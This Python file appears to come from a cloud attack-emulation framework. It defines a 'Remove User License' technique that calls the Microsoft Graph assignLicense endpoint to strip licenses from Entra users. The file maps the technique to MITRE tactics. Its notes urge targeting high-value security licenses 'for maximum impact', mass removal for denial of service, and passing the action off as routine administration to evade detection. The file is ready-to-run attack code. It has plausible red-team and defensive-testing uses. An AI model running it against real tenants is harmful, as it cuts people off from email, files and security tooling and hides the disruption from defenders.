from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraRemoveUserLicense(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1531",
                technique_name="Account Access Removal",
                tactics=["Impact"],
                sub_technique_name=None
            ),
            MitreTechnique(
                technique_id="T1562.008",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion", "Privilege Escalation"],
                sub_technique_name="Disable or Modify Cloud Logs"
            )
        ]

        technique_references = [
            TechniqueReference(
                ref_title="Microsoft Graph - Remove license",
                ref_link="https://learn.microsoft.com/en-us/graph/api/user-assignlicense"
            )
        ]
        
        technique_notes = [
            TechniqueNote("License removal can impact multiple services and access simultaneously"),
            TechniqueNote("Target high-value licenses like Microsoft 365 E5 Security for maximum impact"),
            TechniqueNote("This technique can be used for denial of service by removing licenses from multiple users"),
            TechniqueNote("Run the EntraEnumerateUsers technique to identify high-value targets"),
            TechniqueNote("Run the EntraEnumerateLicenses technique to identify licenses assigned to a user")
        ]
        
        super().__init__(
            "Remove User License", 
            "Removes assigned licenses from target users to cause immediate service disruption. This technique can be used to deny access to critical services by removing service licenses from user accounts, degrading organizational capabilities. License removal impacts multiple services simultaneously, potentially disrupting email, file access, Teams communication, and security features. When executed against privileged users, this technique can create significant operational impact while potentially evading detection as a standard administrative action.",
            mitre_techniques=mitre_techniques,
            references=technique_references,
            notes = technique_notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            # Get required parameters
            user_id: str = kwargs['user_id']
            license_id: str = kwargs['license_id']
            
            # Input validation
            if user_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "User ID is required"
                }
            
            if license_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "License ID is required"
                }
            
            # Request endpoint
            endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/assignLicense"
            
            # Create request payload for license removal
            data = {
                "addLicenses": [],
                "removeLicenses": [license_id]
            }
            
            # Execute request
            raw_response = GraphRequest().post(url=endpoint_url, data=data)
            
            # Handle the response
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully removed license from user {user_id}",
                    "value": {
                        "user_id": user_id,
                        "license_removed": license_id,
                        "status": "success"
                    }
                }
            else:
                # Request failed
                return ExecutionStatus.FAILURE, {
                    "error": {
                        "error_code": raw_response.json().get('error', {}).get('code', 'N/A'),
                        "error_message": raw_response.json().get('error', {}).get('message', 'N/A')
                    },
                    "message": f"Failed to remove license from user {user_id}"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to remove license from user"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "user_id": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Target User ID or UPN", 
                "input_field_type": "text"
            },
            "license_id": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "License SKU ID", 
                "input_field_type": "text"
            }
        }